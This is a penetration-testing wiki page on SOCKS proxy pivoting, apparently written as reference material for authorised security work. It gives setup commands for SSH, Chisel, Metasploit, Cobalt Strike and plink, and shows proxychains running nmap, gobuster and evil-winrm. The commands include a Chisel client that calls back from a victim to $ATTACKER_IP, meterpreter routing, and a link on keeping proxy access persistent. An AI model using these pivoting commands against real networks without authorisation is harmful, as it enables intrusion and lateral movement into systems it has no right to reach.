---
authors: ShutdownRepo, felixbillieres, H4tsuM1ku
category: infra
---

# SOCKS proxy

## Theory

SOCKS (SOCKet Secure) is a network protocol that routes network traffic through a proxy server. A SOCKS proxy provides comprehensive network access without configuring individual ports.

**Use when:**
* Multiple tools need network access
* Full network enumeration is required
* Multiple services need to be accessed

> [!NOTE]
> For single service access, use [Port forwarding](port-forwarding.md) instead. For best tool compatibility, prefer [Ligolo-ng](ligolo-ng.md).

## Practice

### Setup

::: tabs

=== SSH

SSH dynamic port forwarding creates a SOCKS proxy.

```bash
# Create SOCKS proxy on local port
ssh -N -D $LOCAL_PORT $USER@$PIVOT_HOST

# Example: Create SOCKS proxy on port 1080
ssh -N -D 1080 $USER@$PIVOT_HOST
```

**SSH config:**

```bash
Host pivot1
    HostName $PIVOT_HOST
    User $USER
    DynamicForward 1080
    ServerAliveInterval 60
```

=== Chisel

```bash
# Attacker machine
chisel server --reverse --socks5 -p $ATTACKER_PORT

# Victim machine (connects back and creates SOCKS proxy)
chisel client $ATTACKER_IP:$ATTACKER_PORT R:1080:socks
```

=== Metasploit

```bash
# In meterpreter session
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > background

# Create SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 4a
msf > run
```

=== Cobalt Strike

```bash
# In Cobalt Strike beacon
beacon> socks 1080
```

=== plink (Windows)

```bash
# Create SOCKS proxy via SSH
plink.exe -N -D 1080 $USER@$PIVOT_HOST -pw $PASSWORD
```

:::

### Using SOCKS proxies

**Proxychains configuration:**

```bash
# /etc/proxychains4.conf or /etc/proxychains.conf
# strict_chain - all proxies must be online
# dynamic_chain - skip offline proxies
strict_chain
socks5 127.0.0.1 1080

# DNS resolution through proxy (optional)
# proxy_dns
```

**Usage:**

```bash
# Tools through proxychains
proxychains nmap -sT -Pn -n $TARGET
proxychains gobuster dir -u http://$TARGET -w /path/to/wordlist.txt
proxychains evil-winrm -i $TARGET -u $USER -p $PASSWORD
```

> [!WARNING]
> Host discovery (`-sn`) and OS detection (`-O`) do **not** work reliably through SOCKS proxies. Use TCP connect scans (`-sT`) with `-Pn` and `-n`.

### Limitations

* No raw sockets: SYN scans, ICMP pings, OS fingerprinting don't work
* Tool compatibility: Some tools (SMB, LDAP) may not work correctly
* DNS resolution: Requires `proxy_dns` configuration or `/etc/hosts` entries
* Performance: Additional latency compared to direct connections

> [!TIP]
> For better tool compatibility, use [Ligolo-ng](ligolo-ng.md) which provides transparent network access.

### Multi-hop

For multi-hop SOCKS proxies, see [Multi-hop pivoting](../../multi-hop.md#multi-hop-with-dynamic-port-forwarding).

## Resources

* [Choosing a technique](../choosing-a-technique.md) - When to use SOCKS proxy
* [Ligolo-ng](ligolo-ng.md) - Better alternative for tool compatibility
* [Multi-hop pivoting](../../multi-hop.md) - Multi-hop scenarios
* [Operations](../../operations.md) - Using SOCKS proxies
* [Persistence](../../persistence.md) - Maintaining SOCKS proxy access

